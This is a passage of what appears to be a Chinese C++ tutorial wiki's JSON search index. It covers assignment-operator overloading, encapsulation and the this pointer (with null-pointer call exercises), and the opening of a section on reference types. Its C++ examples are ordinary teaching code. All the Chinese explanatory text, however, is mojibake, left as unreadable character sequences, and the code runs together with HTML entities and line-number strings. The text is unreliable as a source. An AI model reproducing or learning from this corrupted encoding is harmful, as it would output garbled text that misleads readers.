operator=(const Derived&amp; other) &#123; if (this != &amp;other) // é˜²æ­¢è‡ªèµ‹å€¼ &#123; Base::operator=(other); // è°ƒç”¨åŸºç±»çš„èµ‹å€¼è¿ç®—ç¬¦ derivedValue = other.derivedValue; &#125; printf(&quot;Derived assignment operator called &quot;); return *this; &#125;&#125;;int main() &#123; Derived original(10, 10); Derived copy(20, 20); // è¿™å°†è°ƒç”¨æ´¾ç”Ÿç±»çš„æ‹·è´æ„é€ å‡½æ•° copy = original; // ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦è¿›è¡Œå¯¹è±¡æ‹·è´ printf(&quot;Original: baseValue = %d, derivedValue = %d &quot;, original.baseValue, original.derivedValue); printf(&quot;Copy: baseValue = %d, derivedValue = %d &quot;, copy.baseValue, copy.derivedValue); return 0;&#125; å°ç»“ å¦‚æœä¸éœ€è¦æ·±æ‹·è´ï¼Œä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦å³å¯ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆå¯¹è±¡æ‹·è´çš„ä»£ç  å¦‚æœç±»ä¸­å«æœ‰æŒ‡é’ˆæˆå‘˜ï¼Œé‚£å°±å¿…é¡»è¦è‡ªå·±é‡è½½èµ‹å€¼è¿ç®—ç¬¦ï¼Œå› ä¸ºé»˜è®¤èµ‹å€¼è¿ç®—ç¬¦æ˜¯æµ…æ‹·è´ï¼Œæ— æ³•å»åšç”³è¯·ä¸€å—å†…å­˜è¿™ç§å¤æ‚åŠ¨ä½œ æ³¨ï¼šå¦‚æœè‡ªå·±å®ç°èµ‹å€¼è¿ç®—ç¬¦é‡è½½ï¼Œæ‰€æœ‰æˆå‘˜çš„æ‹·è´å°±è¦è‡ªå·±æ¥å¤„ç†"},{"title":"å°è£…å’ŒthisæŒ‡é’ˆ","path":"/wiki/C++/å°è£…å’ŒthisæŒ‡é’ˆ.html","content":"é¢å‘å¯¹è±¡å’Œé¢å‘è¿‡ç¨‹ä¸‰ä¸ªæœ¬è´¨çš„åŒºåˆ«ï¼šå°è£…ï¼Œç»§æ‰¿ï¼Œå¤šæ€ã€‚ å°è£… C++åœ¨Cçš„åŸºç¡€ä¸Šåšæ‹“å±•ï¼ˆå°è£…ã€ç»§æ‰¿ã€å¤šæ€ã€æ¨¡æ¿ç­‰ï¼‰ï¼Œè¿™äº›æ‹“å±•èƒ½è®©ç¼–ç¨‹çš„äººå†™ä»£ç æ›´çœäº‹ï¼Œä½†çœä¸‹æ¥çš„è¿™äº›äº‹å¹¶æ²¡æœ‰å‡­ç©ºæ¶ˆå¤±ï¼Œåè€Œæ˜¯ç¼–è¯‘å™¨åšçš„äº‹æƒ…æ›´å¤šäº†ï¼Œç”±ç¼–è¯‘å™¨å¸®æˆ‘ä»¬ç”Ÿæˆä»£ç ã€‚ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸€äº›ä¾‹å­ï¼Œæ¥ä½“ä¼šå°è£…è¿™ä¸ªæ¦‚å¿µã€‚ ä¾‹1 123456789101112131415161718struct Student &#123; int a; int b; int c; int d;&#125;; int Plus(Student s) &#123; return s.a + s.b + s.c + s.d;&#125; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; int res = Plus(s); return;&#125; ç»“æ„ä½“ä½œä¸ºå‡½æ•°å‚æ•°ï¼Œç”Ÿæˆçš„æ±‡ç¼–ä»£ç æ˜¯å†…å­˜å¤åˆ¶ã€‚ç¼–è¯‘å™¨ä¸ç¡®å®šè¿™ä¸ªç»“æ„ä½“æœ‰å¤šå°‘ä¸ªå‚æ•°ï¼Œæ¯ä¸ªå‚æ•°æ˜¯ä»€ä¹ˆç±»å‹ã€‚æ‰€ä»¥ç»“æ„ä½“ä¼ å‚ç”Ÿæˆçš„æ±‡ç¼–ä»£ç å°±æ˜¯å…ˆæå‡å †æ ˆç»™ç©ºé—´ï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªç§»ã€‚ ä¾‹2 ä¾‹1ä½¿ç”¨ç»“æ„ä½“ä½œä¸ºå‡½æ•°å‚æ•°ï¼Œä¼šå‘ç”Ÿå¤§ç‰‡å†…å­˜çš„å¤åˆ¶ç§»åŠ¨ï¼Œå¼€é”€å¤§ã€‚å»ºè®®ä½¿ç”¨ç»“æ„ä½“æŒ‡é’ˆä½œä¸ºå‚æ•° 12345678910111213141516171819struct Student &#123; int a; int b; int c; int d;&#125;; int Plus(Student* p) &#123; return p-&gt;a + p-&gt;b + p-&gt;c + p-&gt;d;&#125; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; int res = Plus(&amp;s); return;&#125; ä¾‹3 ä¾‹2è¿˜æ˜¯å­˜åœ¨é—®é¢˜ï¼š å‡½æ•°å†…éƒ¨ä½¿ç”¨ç»“æ„ä½“æˆå‘˜æ—¶ï¼šå¦‚æœè¿™ä¸ªç»“æ„ä½“æ˜¯40ä¸ªæˆå‘˜è¦ç›¸åŠ å‘¢ï¼Ÿæ¯ä¸ªå˜é‡éƒ½è¦ç”¨è¿™æ ·çš„å½¢å¼è¡¨ç¤ºp-&gt;aï¼Œé‚£å¤ªéº»çƒ¦äº† å‡½æ•°å‚æ•°åˆ—è¡¨ï¼šå¦‚æœæœ‰40ä¸ªç±»ä¼¼plusçš„å‡½æ•°ï¼Œæ¯ä¸ªå‡½æ•°éƒ½è¦ç”¨è¿™ä¸ªç»“æ„ä½“æŒ‡é’ˆä½œä¸ºå‚æ•°å‘¢ï¼Ÿ ä»ä¸Šé¢ä¸¤ç‚¹ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†éº»çƒ¦çš„åœ°æ–¹ï¼Œæˆ‘ä»¬çš„è§£å†³åŠæ³•æ˜¯ï¼šæŠŠå‡½æ•°å†™åˆ°ç»“æ„ä½“é‡Œï¼Œè¿™å°±æ˜¯ä¸€ç§å°è£…ï¼Œå‡½æ•°å¯ä»¥æ–¹ä¾¿åœ°ä½¿ç”¨ç»“æ„ä½“é‡Œçš„å˜é‡ã€‚ 12345678910111213141516171819struct Student &#123; int a; int b; int c; int d; int Plus() &#123; return a + b + c + d; &#125;&#125;; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; int res = s.Plus(); return;&#125; ç¬¬19è¡Œï¼Œå‰é¢ç”¨s.ï¼Œè¯´æ˜è°ƒç”¨çš„æ˜¯ç±»sä¸­çš„pluså‡½æ•°ï¼Œè€Œä¸æ˜¯å…¶ä»–ç±»çš„pluså‡½æ•°ã€‚ æˆ–è€…è¯´ï¼Œè°ƒç”¨çš„ä¸æ˜¯ssç»“æ„ä½“ä¸­çš„pluså‡½æ•° å¹¶ä¸”çœ‹è°ƒç”¨pluså‡½æ•°æ—¶çš„åæ±‡ç¼–ä»£ç ï¼Œå’Œä¾‹2æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬ä¸å†éœ€è¦å»å†™ä¼ å‚ã€å†å»ä½¿ç”¨æŒ‡é’ˆçš„è°ƒç”¨æ–¹å¼ï¼Œè¿™äº›å·¥ä½œéƒ½ç”±ç¼–è¯‘å™¨å¸®æˆ‘ä»¬å®Œæˆäº†ã€‚ pluså‡½æ•°å†…éƒ¨çš„ä»£ç å’Œä¾‹2ä¹Ÿæ˜¯ä¸€æ ·çš„ ä¾‹3çš„pluså‡½æ•°å†…éƒ¨ä¾‹2çš„pluså‡½æ•°å†…éƒ¨ æ³¨æ„ï¼špluså‡½æ•°è¿˜æ˜¯åœ¨å…¨å±€çš„åœ°å€ï¼Œå¹¶ä¸åœ¨ç»“æ„ä½“é‡Œã€‚ è¯æ˜æ–¹å¼ä¸€ï¼šä¾‹3pluså‡½æ•°åœ°å€ä¸º00401014ï¼Œä¾‹2pluså‡½æ•°åœ°å€ä¸º0040100Fã€‚ æ–¹å¼äºŒï¼šsizeof(Student)çœ‹ä¸€ä¸‹ï¼Œç»“æœæ˜¯16ï¼ˆ4ä¸ªintç±»å‹ä¹‹å’Œï¼‰ ç»¼ä¸Šï¼Œè¿™å°±æ˜¯C++å°è£…ï¼ˆå‡½æ•°æ”¾åˆ°ç»“æ„ä½“é‡Œï¼‰è¿™ä¸ªæ¦‚å¿µçš„æ¨å¯¼è¿‡ç¨‹ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾ˆå®¹æ˜“ç†è§£C++ä¸­çš„è¿™äº›æ–°æ¦‚å¿µï¼š ç±»ï¼šå¸¦æœ‰å‡½æ•°çš„ç»“æ„ä½“ï¼Œç§°ä¸ºç±» æˆå‘˜å‡½æ•°ï¼šç»“æ„ä½“é‡Œçš„å‡½æ•°ï¼Œç§°ä¸ºæˆå‘˜å‡½æ•° æ”¾å¤–é¢çš„å‡½æ•°å’Œæ”¾åœ¨ç±»ä¸­çš„å‡½æ•°çš„åŒºåˆ«ï¼š å¯¹äºåº•å±‚äººå‘˜ï¼Œé€†å‘çš„äººï¼šæ²¡æœ‰åŒºåˆ« å¯¹äºç¼–è¯‘å™¨ï¼šä½œç”¨èŒƒå›´å˜äº†ï¼Œè¦ç”¨ç±».æˆå‘˜å‡½æ•°æ¥è®¿é—® è°ƒç”¨æ–¹å¼ å‚æ•° æ”¾å¤–é¢çš„å‡½æ•° å‡½æ•°å æ”¾åœ¨ç±»ä¸­çš„å‡½æ•° å¯¹è±¡.æˆå‘˜å‡½æ•° å¤šä¼ äº†ä¸ªthisæŒ‡é’ˆ thisæŒ‡é’ˆ çœ‹å›ä¸Šä¸€èŠ‚ä¾‹3çš„åæ±‡ç¼–ä»£ç  12345678910111213141516171819struct Student &#123; int a; int b; int c; int d; int Plus() &#123; return a + b + c + d; &#125;&#125;; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; int res = s.Plus(); return;&#125; è°ƒç”¨pluså‡½æ•°æ—¶å¹¶æ²¡æœ‰ä¼ å‚æ•°ï¼Œå´å‘ç°äº†ç»“æ„ä½“Studenté¦–åœ°å€é€šè¿‡ecxå¯„å­˜å™¨ä¼ è¿‡æ¥äº†ã€‚ å³ä½¿å°†Studentä¸­pluså‡½æ•°æ”¹ä¸ºä¸è¿”å›ä»»ä½•å€¼ï¼ˆvoidè¿”å›ç±»å‹ï¼‰ï¼Œå‡½æ•°å†…éƒ¨ä¹Ÿä¸åšä»»ä½•æ“ä½œï¼Œç»“æ„ä½“Studenté¦–åœ°å€è¿˜æ˜¯ä¼šè¢«å½“å‚æ•°ä¼ è¿‡æ¥ 12345678910111213141516171819struct Student &#123; int a; int b; int c; int d; void Plus() &#123; &#125;&#125;; void main() &#123; Student s = &#123;1, 2, 3, 4&#125;; s.Plus(); return;&#125; ä¹Ÿå°±æ˜¯è¯´ï¼ŒthisæŒ‡é’ˆæ˜¯ç¼–è¯‘å™¨é»˜è®¤ä¼ å…¥çš„ï¼Œç”¨ecxå¯„å­˜å™¨ä¼ é€’ã€‚ æ—¢ç„¶æˆå‘˜å‡½æ•°éƒ½ä¼šæœ‰thisæŒ‡é’ˆè¿™ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆåœ¨æˆå‘˜å‡½æ•°ä¸­èƒ½å¦ä½¿ç”¨è¿™ä¸ªæŒ‡é’ˆï¼Ÿç­”æ¡ˆæ˜¯å¯ä»¥çš„ã€‚ ä¸‹é¢çš„ç¨‹åºï¼Œé€šè¿‡Initæ¥åˆå§‹åŒ–æˆå‘˜çš„å€¼ï¼Œä¸€ä¸ªæ˜¯ä¸åˆé¢„æœŸçš„ç”¨æ³•ï¼Œä¸€ä¸ªæ˜¯æ­£ç¡®çš„ç”¨æ³•ã€‚ ä¸åˆé¢„æœŸçš„ç”¨æ³•åˆé¢„æœŸçš„ç”¨æ³•123456789101112131415161718struct Student &#123; int a; int b; void Init(int a, int b) &#123; a = a; b = b; &#125; &#125;; void main() &#123; Student s; s.Init(1,2); return;&#125; åæ±‡ç¼–çœ‹åˆ°ä»[ebp+8]å–å‡ºå€¼æ”¾åˆ°eaxï¼Œåˆæ”¾å›[ebp+8]ã€‚ è¿™æ˜¯å› ä¸ºå‡½æ•°å†…éƒ¨ç”¨å˜é‡aï¼Œæ˜¯æŒ‡å‚æ•°ã€‚å¦‚æœæ˜¯æŒ‡æˆå‘˜å˜é‡aï¼Œè¦ç”¨thisæŒ‡é’ˆã€‚1234567891011121314151617struct Student &#123; int a; int b; void Init(int a, int b) &#123; this-&gt;a = a; this-&gt;b = b; &#125; &#125;; void main() &#123; Student s; s.Init(1,2); return;&#125; thisæŒ‡é’ˆå°†Studentç±»çš„é¦–åœ°å€ä¼ è¿›æ¥äº†ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€æ¥å¯»å€ï¼Œæ‰¾åˆ°æˆå‘˜å˜é‡açš„ä½ç½® å°ç»“ æˆå‘˜å‡½æ•°éƒ½æœ‰thisæŒ‡é’ˆï¼ŒthisæŒ‡é’ˆæŒ‡å‘çš„æ˜¯è¯¥ç±»çš„é¦–åœ°å€ï¼Œæ— è®ºè¯¥æˆå‘˜å‡½æ•°å†…éƒ¨æ˜¯å¦ä½¿ç”¨åˆ°thisæŒ‡é’ˆ thisæŒ‡é’ˆæ˜¯ç¼–è¯‘å™¨é»˜è®¤ä¼ å…¥çš„ï¼Œé€šå¸¸ä½¿ç”¨ecxå¯„å­˜å™¨è¿›è¡Œä¼ é€’ï¼ˆå¯ä½œä¸ºåæ±‡ç¼–æ—¶åˆ¤æ–­ç›®æ ‡ç¨‹åºç¼–å†™è¯­è¨€æ˜¯Cè¿˜æ˜¯C++çš„ä¾æ®ï¼‰ã€‚ æˆå‘˜å‡½æ•°ç”¨çš„å‡½æ•°è°ƒç”¨çº¦å®šæ˜¯thiscall è°ƒç”¨çº¦å®š å‚æ•°ä¼ é€’æ–¹å¼ è°è´Ÿè´£å¹³æ ˆï¼Ÿ åœºæ™¯ thiscall ä»å³å‘å·¦å…¥æ ˆå¦‚æœå‚æ•°ä¸ªæ•°ç¡®å®š, thisæŒ‡é’ˆé€šè¿‡ecxä¼ é€’ç»™è¢«è°ƒç”¨è€…, å¦‚æœå‚æ•°ä¸ªæ•°ä¸ç¡®å®š, thisæŒ‡é’ˆåœ¨æ‰€æœ‰å‚æ•°å‹æ ˆåè¢«å‹å…¥å †æ ˆ å‚æ•°ä¸ªæ•°ä¸å®šçš„, è°ƒç”¨è€…calling functionæ¸…ç†å †æ ˆ ï¼Œå¤–å¹³æ ˆå‚æ•°ä¸ªæ•°ç¡®å®šçš„ï¼Œè¢«è°ƒæ–¹called functionï¼Œæ¸…ç†å †æ ˆï¼Œå†…å¹³æ ˆ æˆå‘˜ç¼ºçœè°ƒç”¨çº¦å®š thisæŒ‡é’ˆçš„ä½œç”¨ åŒºåˆ†å‚æ•°å’Œæˆå‘˜å˜é‡ è¿”å›å½“å‰å¯¹è±¡çš„é¦–åœ°å€ 1234567891011121314151617181920#include &lt;stdio.h&gt;struct Student &#123; int a; int b; // æˆå‘˜å‡½æ•°ï¼Œè¿”å›å½“å‰å¯¹è±¡çš„é¦–åœ°å€ Student* getAddress() &#123; return this; &#125;&#125;; void main() &#123; Student s; printf(&quot;%p &quot;,s.getAddress()); return;&#125; thisä¸èƒ½åšè¿ç®—ï¼Œä¸èƒ½è¢«é‡æ–°èµ‹å€¼ thisæŒ‡é’ˆå­˜åœ¨çš„æ„ä¹‰å°±æ˜¯æ–¹ä¾¿ç¼–ç¨‹äººå‘˜ä½¿ç”¨ç±»ä¸­çš„æˆå‘˜ï¼Œè€Œå¯¹thisæŒ‡é’ˆåšè¿ç®—ï¼ŒåŠ å‡ï¼Œé‡æ–°èµ‹å€¼è¿™äº›æ“ä½œï¼Œæ²¡æœ‰æ„ä¹‰ï¼Œè¿èƒŒäº†ç¼–è¯‘å™¨çš„åˆè¡·ã€‚ï¼ˆç›´æ¥å¯¹thisåšè¿ç®—ç¼–è¯‘ä¼šä¸é€šè¿‡ã€‚å½“ç„¶ï¼Œæƒ³æ”¹çš„è¯ï¼Œå¼ºè½¬ä¸ºå…¶ä»–ç±»å‹ç„¶åå†è¿ç®—ä¹Ÿèƒ½æ”¹ï¼‰ thisæŒ‡é’ˆå­˜åœ¨çš„å«ä¹‰å°±æ˜¯æŒ‡å‘å½“å‰è¿™ä¸ªå¯¹è±¡çš„é¦–åœ°å€ï¼Œå¯¹å®ƒåšä»»ä½•æ“ä½œéƒ½æ˜¯æ— æ„ä¹‰çš„ã€‚ å¯¹äºç¼–è¯‘å™¨è€Œè¨€ï¼ŒthisæŒ‡é’ˆçš„å€¼æ°¸è¿œåªæœ‰ä¸€ä¸ªï¼Œæ°¸è¿œä¸éœ€è¦å˜åŒ–ã€‚ thisæŒ‡é’ˆä¸å ç”¨ç»“æ„ä½“çš„å®½åº¦ ç»ƒä¹  ç©ºç»“æ„ä½“çš„å¤§å°æ˜¯å¤šå°‘ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ ç­”æ¡ˆé˜²æ­¢ï¼šå£°æ˜äº†ä¸€ä¸ªç©ºç±»ï¼Œç„¶åå®ä¾‹åŒ–äº†ä¸åŒçš„å¯¹è±¡ï¼Œè€Œè¿™äº›å¯¹è±¡æ‹¥æœ‰ç›¸åŒçš„åœ°å€ï¼Œé‚£å°±éº»çƒ¦äº†ã€‚chatgptï¼šåœ¨Cè¯­è¨€ä¸­ï¼Œç©ºç»“æ„ä½“çš„å¤§å°æ˜¯æœªå®šä¹‰çš„ã€‚C99æ ‡å‡†æŒ‡å‡ºï¼Œå¦‚æœç»“æ„ä½“å£°æ˜åˆ—è¡¨ä¸åŒ…å«å‘½åæˆå‘˜ï¼Œåˆ™å…¶è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚ç„¶è€Œï¼ŒGCCå…è®¸å®šä¹‰ä¸€ä¸ªæ²¡æœ‰æˆå‘˜çš„ç»“æ„ä½“ï¼Œå¹¶å°†å…¶å¤§å°å®šä¹‰ä¸º0ã€‚ä½†æ˜¯ï¼Œè¿™å¹¶ä¸æ˜¯æ ‡å‡†Cçš„è¡Œä¸ºï¼Œè€Œæ˜¯ç‰¹å®šç¼–è¯‘å™¨çš„æ‰©å±•ã€‚åœ¨Cppä¸­ï¼Œç©ºç»“æ„ä½“çš„å¤§å°æ˜¯1å­—èŠ‚ã€‚è¿™æ˜¯å› ä¸ºCæ ‡å‡†è§„å®šï¼Œæ¯ä¸ªå¯¹è±¡å¿…é¡»æœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„åœ°å€ï¼Œå³ä½¿æ˜¯ç©ºå¯¹è±¡ã€‚å¦‚æœç©ºç»“æ„ä½“çš„å¤§å°æ˜¯0ï¼Œé‚£ä¹ˆä¸¤ä¸ªä¸åŒçš„ç©ºç»“æ„ä½“å®ä¾‹å¯èƒ½ä¼šå¾—åˆ°ç›¸åŒçš„åœ°å€ï¼Œè¿™è¿åäº†æ ‡å‡†ã€‚å› æ­¤ï¼ŒCä¸­ç©ºç»“æ„ä½“è‡³å°‘å ç”¨1å­—èŠ‚çš„ç©ºé—´ï¼Œä»¥ç¡®ä¿æ¯ä¸ªå®ä¾‹éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„åœ°å€ã€‚å‚è€ƒï¼šä¸ºä»€ä¹ˆC++ ä¸­ç©ºç±»çš„å¤§å°æ˜¯1ä¸ªå­—èŠ‚ï¼Ÿ ä¸‹é¢è¿™æ®µä»£ç èƒ½å¦æ‰§è¡Œï¼Ÿ 1234567891011121314151617181920212223#include &lt;stdio.h&gt;struct Person &#123; void Fn_1() &#123; printf(&quot;Person:Fn_1() &quot;); &#125; void Fn_2() &#123; printf(&quot;Person:Fn_2() &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; Person* p = NULL; p-&gt;Fn_1(); p-&gt;Fn_2(); return 0; &#125; ç­”æ¡ˆèƒ½æ‰§è¡Œã€‚æˆå‘˜å‡½æ•°ä¸åœ¨ç»“æ„ä½“ä¸­ï¼Œç¼–è¯‘æ—¶å°±å·²ç¡®å®šäº†å‡½æ•°çš„åœ°å€ã€‚è€Œä¸”åœ¨è¿™ä¸ªä¾‹å­ä¸­Fn_1å’ŒFn_2æ²¡æœ‰ç”¨åˆ°æˆå‘˜å˜é‡ï¼ŒthisæŒ‡é’ˆä¸º0ä¹Ÿæ²¡å…³ç³»ã€‚æˆ‘ä»¬ä»èƒ½å¤Ÿé€šè¿‡p-&gt;Fn_1()å’Œp-&gt;Fn_2()çš„æ–¹å¼æ¥è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°ã€‚å°½ç®¡å¦‚æ­¤ï¼Œè¿™æ ·åšæ˜¯å±é™©ä¸”ä¸æå€¡çš„ã€‚chatgptçš„å›ç­”ï¼šè¿™æ®µC++ä»£ç ä¹‹æ‰€ä»¥èƒ½å¤Ÿæ‰§è¡Œï¼Œä¸»è¦æ˜¯å› ä¸ºæˆå‘˜å‡½æ•°ï¼ˆmember functionï¼‰è°ƒç”¨åœ¨ç¼–è¯‘æ—¶å°±å·²ç»ç¡®å®šäº†å‡½æ•°çš„åœ°å€ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒFn_1å’ŒFn_2éƒ½ä¸éœ€è¦è®¿é—®ä»»ä½•éé™æ€æˆå‘˜å˜é‡ï¼Œå› æ­¤å®ƒä»¬å®é™…ä¸Šå¹¶ä¸éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„thisæŒ‡é’ˆã€‚å½“ä½ åˆ›å»ºä¸€ä¸ªç±»çš„å¯¹è±¡å¹¶è°ƒç”¨å…¶æˆå‘˜å‡½æ•°æ—¶ï¼ŒthisæŒ‡é’ˆé€šå¸¸æŒ‡å‘å¯¹è±¡çš„å†…å­˜åœ°å€ã€‚ç„¶è€Œï¼Œå¦‚æœæˆå‘˜å‡½æ•°ä¸è®¿é—®å¯¹è±¡çš„ä»»ä½•æˆå‘˜å˜é‡ï¼ˆå³å®ƒä»¬ä¸ä¾èµ–äºå¯¹è±¡çš„çŠ¶æ€ï¼‰ï¼Œé‚£ä¹ˆå®ƒä»¬å®é™…ä¸Šå¹¶ä¸éœ€è¦ä¸€ä¸ªæŒ‡å‘æœ‰æ•ˆå¯¹è±¡çš„thisæŒ‡é’ˆã€‚åœ¨ä½ çš„ä»£ç ä¸­ï¼ŒPerson* p = NULL;å°†påˆå§‹åŒ–ä¸ºNULLï¼Œè¿™æ„å‘³ç€å®ƒä¸æŒ‡å‘ä»»ä½•æœ‰æ•ˆçš„å†…å­˜åœ°å€ã€‚å°½ç®¡å¦‚æ­¤ï¼Œä½ ä»ç„¶èƒ½å¤Ÿè°ƒç”¨p-&gt;Fn_1()å’Œp-&gt;Fn_2()ï¼Œå› ä¸ºè¿™äº›å‡½æ•°å†…éƒ¨ä¸è®¿é—®ä»»ä½•Personå¯¹è±¡çš„æˆå‘˜å˜é‡ã€‚ç„¶è€Œï¼Œè¿™ç§åšæ³•æ˜¯å±é™©çš„ï¼Œå› ä¸ºå¦‚æœFn_1æˆ–Fn_2å‡½æ•°è¯•å›¾è®¿é—®å¯¹è±¡çš„æˆå‘˜å˜é‡æˆ–è€…è°ƒç”¨å…¶ä»–ä¾èµ–äºthisæŒ‡é’ˆçš„æˆå‘˜å‡½æ•°ï¼Œç¨‹åºå°†ä¼šå´©æºƒï¼Œå› ä¸ºthisæŒ‡é’ˆæ˜¯NULLã€‚ ä¸‹é¢è¿™æ®µä»£ç èƒ½å¦æ‰§è¡Œï¼Ÿ 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;struct Person&#123; int x; void Fn_1() &#123; printf(&quot;Person:Fn_1() &quot;); &#125; void Fn_2() &#123; x = 10; printf(&quot;Person:Fn_2() &quot;); &#125;&#125;;int main(int argc, char *argv[])&#123; Person *p = NULL; p-&gt;Fn_1(); p-&gt;Fn_2(); return 0;&#125; ç­”æ¡ˆç¼–è¯‘é€šè¿‡ï¼Œæ‰§è¡ŒæŠ¥0xC0000005è®¿é—®é”™è¯¯ã€‚thisæŒ‡é’ˆæŒ‡å‘åœ°å€0ï¼ŒFn_1()è¿˜æ˜¯å¯ä»¥è°ƒç”¨ï¼Œå› ä¸ºæ²¡ç”¨åˆ°thisæŒ‡é’ˆï¼Œä½†æ˜¯Fn_2()å‡½æ•°æ‰§è¡Œä¼šæŠ¥é”™ï¼Œå› ä¸ºè¯¥å‡½æ•°é‡Œx=10è¿™å¥ç”¨åˆ°äº†thisæŒ‡é’ˆï¼Œå®ƒæƒ³æŠŠ0åœ°å€å¤„èµ·çš„intå¤§å°æ”¹ä¸º10ï¼Œä½†0åœ°å€æ²¡æŒ‚ç‰©ç†é¡µï¼Œæ‰€ä»¥æŠ¥é”™ã€‚"},{"title":"å¼•ç”¨ç±»å‹","path":"/wiki/C++/å¼•ç”¨ç±»å‹.html","content":"å¼•ç”¨ç±»å‹ç”¨æ³• å¼•ç”¨å°±æ˜¯å˜é‡çš„â€œåˆ«åâ€ï¼ŒReferences must be initialized when defined ä¸‹é¢åˆ†åˆ«åˆ›å»ºåŸºæœ¬ç±»å‹ã€ç±»ã€æŒ‡é’ˆç±»å‹ã€æ•°ç»„ç±»å‹çš„å¼•ç”¨ç±»å‹ï¼Œå¹¶ä½¿ç”¨å¼•ç”¨ç±»å‹ã€‚æ¥çœ‹ä¸‹å¼•ç”¨ç±»å‹çš„ç”¨æ³• 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;class Person&#123;public: int x;&#125;;int main()&#123; // åŸºæœ¬ç±»å‹ int x = 10; int&amp; ref1 = x; ref1 = 20; // é€šè¿‡å¼•ç”¨ç±»å‹ä¿®æ”¹x printf(&quot;%d &quot;, x); // æ‰“å°xçš„å€¼ï¼Œè§‚å¯Ÿä¿®æ”¹æƒ…å†µï¼Œçœ‹åˆ°è¾“å‡ºæ˜¯20 // ç±» Person p; p.x = 10; Person &amp;ref2 = p; ref2.x = 20; // é€šè¿‡å¼•ç”¨ç±»å‹ä¿®æ”¹x printf(&quot;%d &quot;, p.x); // æ‰“å°p.xçš„å€¼ï¼Œè§‚å¯Ÿä¿®æ”¹æƒ…å†µï¼Œçœ‹åˆ°è¾“å‡ºæ˜¯20 // æŒ‡é’ˆç±»å‹ int** y = (int **)10; // æŒ‡é’ˆyæŒ‡å‘10 int**&amp; ref3 = y; // ä¸¤ä¸ª**ï¼Œint**ååŠ ä¸ª&amp;ï¼Œå°±æ˜¯int**&amp; ref3 = (int**)20; // é€šè¿‡å¼•ç”¨ç±»å‹ä¿®æ”¹x printf(&quot;%d &quot;, y); // æ‰“å°yçš„å€¼ï¼Œè§‚å¯Ÿä¿®æ”¹æƒ…å†µï¼Œçœ‹åˆ°è¾“å‡ºæ˜¯20ï¼ˆæŒ‡é’ˆç°åœ¨æŒ‡å‘äº†20ï¼‰ // æ•°ç»„ç±»å‹ int arr[] = &#123;10, 20, 30&#125;; int(&amp;ref4)[3] = arr; // int(*p)[3]æ•°ç»„æŒ‡é’ˆï¼Œ*æ¢æˆ&amp;ï¼Œå°±æ˜¯int(&amp;p)[3] ref4[0] = 20; // é€šè¿‡å¼•ç”¨ç±»å‹ä¿®æ”¹æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼ printf(&quot;%d &quot;, arr[0]); // æ‰“å°arr[0]çš„å€¼ï¼Œè§‚å¯Ÿä¿®æ”¹æƒ…å†µï¼Œçœ‹åˆ°è¾“å‡ºæ˜¯20 return 0;&#125; å¼•ç”¨ç±»å‹çš„æœ¬è´¨ é€šè¿‡åæ±‡ç¼–æŸ¥çœ‹ä¸Šé¢ä»£ç ä¸­çš„å¼•ç”¨ç±»å‹æ˜¯æ€ä¹ˆå®ç°â€œå˜é‡çš„åˆ«åâ€è¿™ä¸€åŠŸèƒ½ ä»¥åŸºæœ¬ç±»å‹å¼•ç”¨ä¸ºä¾‹ï¼Œå…¶ä»–çš„ç±»å‹é“ç†ä¸€æ ·çš„ 12345678910111213141516171819#include &lt;stdio.h&gt;int main()&#123; // åŸºæœ¬ç±»å‹ int x = 10; //å¼•ç”¨ç±»å‹ int&amp; ref = x; ref = 20; // é€šè¿‡å¼•ç”¨ç±»å‹ä¿®æ”¹x printf(&quot;%d &quot;, x); // æ‰“å°xçš„å€¼ï¼Œè§‚å¯Ÿä¿®æ”¹æƒ…å†µï¼Œçœ‹åˆ°è¾“å‡ºæ˜¯20 //æŒ‡é’ˆ int* p = &amp;x; *p = 30; // é€šè¿‡æŒ‡é’ˆä¿®æ”¹x printf(&quot;%d &quot;, x); // æ‰“å°xçš„å€¼ï¼Œè§‚å¯Ÿä¿®æ”¹æƒ…å†µï¼Œçœ‹åˆ°è¾“å‡ºæ˜¯30 return 0;&#125; å‘ç°å¼•ç”¨ç±»å‹å’ŒæŒ‡é’ˆåæ±‡ç¼–æ˜¯ä¸€æ ·çš„ å¼•ç”¨ç±»å‹å’ŒæŒ‡é’ˆçš„åŒºåˆ« ä»ä¸Šé¢çš„ä¾‹å­ï¼Œæš‚ä¸”å¾—å‡ºä¸€ä¸ªç»“è®ºï¼šå¼•ç”¨å°±æ˜¯æŒ‡é’ˆã€‚ä½†ç»†æƒ³ï¼Œå¦‚æœå¼•ç”¨å°±æ˜¯æŒ‡é’ˆï¼ŒC++ä¸ºä»€ä¹ˆè¦å‘æ˜å¼•ç”¨ç±»å‹ï¼Ÿæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è®©æŒ‡é’ˆç±»å‹ï¼Œå¼•ç”¨ç±»å‹åˆ†åˆ«åšåˆå§‹åŒ–ï¼Œè¿ç®—ï¼Œèµ‹å€¼ï¼Œæ¥å¯¹æ¯”è§‚å¯Ÿå®ƒä»¬çš„ä¸åŒï¼š 